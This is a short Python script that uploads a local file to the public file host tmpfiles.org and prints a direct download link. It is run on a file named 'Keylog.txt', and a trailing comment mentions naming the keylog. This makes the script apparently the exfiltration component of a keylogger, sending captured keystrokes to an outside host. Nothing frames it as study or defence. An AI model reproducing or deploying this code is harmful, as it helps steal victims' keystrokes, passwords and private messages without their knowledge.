import requests
import os
def upload_to_tmpfiles(file_path):
    filename = os.path.basename(file_path)
    
    with open(file_path, 'rb') as f:
        # tmpfiles.org preserves exact filename
        files = {'file': (filename, f)}
        response = requests.post('https://tmpfiles.org/api/v1/upload', files=files)
    
    if response.status_code == 200:
        data = response.json()
        # Returns predictable URL: https://tmpfiles.org/dl/123456/test.txt
        download_url = data['data']['url'].replace('/v/', '/dl/')
        print(f"Fixed URL: {download_url}")
        return download_url
    return None

upload_to_tmpfiles('Keylog.txt')

# ADD CUSTOM NAME TO THE KEYLOG.txt